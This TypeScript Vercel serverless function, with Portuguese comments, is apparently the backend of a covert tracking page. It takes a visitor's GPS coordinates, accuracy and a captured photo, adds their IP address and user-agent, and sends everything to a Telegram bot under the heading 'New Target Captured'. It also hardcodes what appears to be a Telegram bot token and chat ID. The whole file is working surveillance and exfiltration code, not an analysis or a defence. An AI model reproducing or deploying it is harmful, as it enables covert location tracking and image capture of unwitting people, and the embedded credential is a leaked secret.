import type { VercelRequest, VercelResponse } from "@vercel/node";
import axios from "axios";

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { lat, lon, acc, photo } = req.body;
  const token = process.env.TELEGRAM_TOKEN || "8284281370:AAGx1imVShG-cvAlUjadyuQTIqhRV-LABVY";
  const chatId = process.env.LOG_CHAT_ID || "6846046252";

  const ua = req.headers["user-agent"] || "unknown";
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.socket.remoteAddress;

  const message = `🎯 **Novo Alvo Capturado!**\n` +
    `🌐 **IP:** \`${ip}\`\n` +
    `📱 **User-Agent:** \`${ua}\`\n` +
    `📍 **Localização:** https://www.google.com/maps/place/${lat},${lon}\n` +
    `📏 **Precisão:** ${acc}m`;

  try {
    // 1. Enviar mensagem de texto
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    // 2. Enviar foto se existir
    if (photo) {
      try {
        // O photo vem como base64: "data:image/jpeg;base64,..."
        const base64Data = photo.split(",")[1];
        const buffer = Buffer.from(base64Data, "base64");
        
        // Telegram API aceita Buffer diretamente se for passado com o arquivo
        const formData = new URLSearchParams();
        formData.append("chat_id", chatId);
        
        // Para enviar arquivo real via axios sem a lib form-data, 
        // a forma mais simples em serverless é usar o endpoint do Telegram que aceita URL ou enviar via multipart manual.
        // Mas o Telegram também aceita o binário se formatado corretamente.
        
        // Vou usar FormData do próprio Node (disponível em versões recentes)
        const fd = new FormData();
        fd.append("chat_id", chatId);
        const blob = new Blob([buffer], { type: "image/jpeg" });
        fd.append("photo", blob, "capture.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: fd
        });
      } catch (photoErr) {
        console.error("Erro ao enviar foto para o Telegram:", photoErr);
      }
    }

    return res.status(200).json({ status: "ok" });
  } catch (err: any) {
    console.error("Erro no bot Seeker:", err.response?.data || err.message);
    return res.status(500).json({ error: "Failed to send to Telegram" });
  }
}
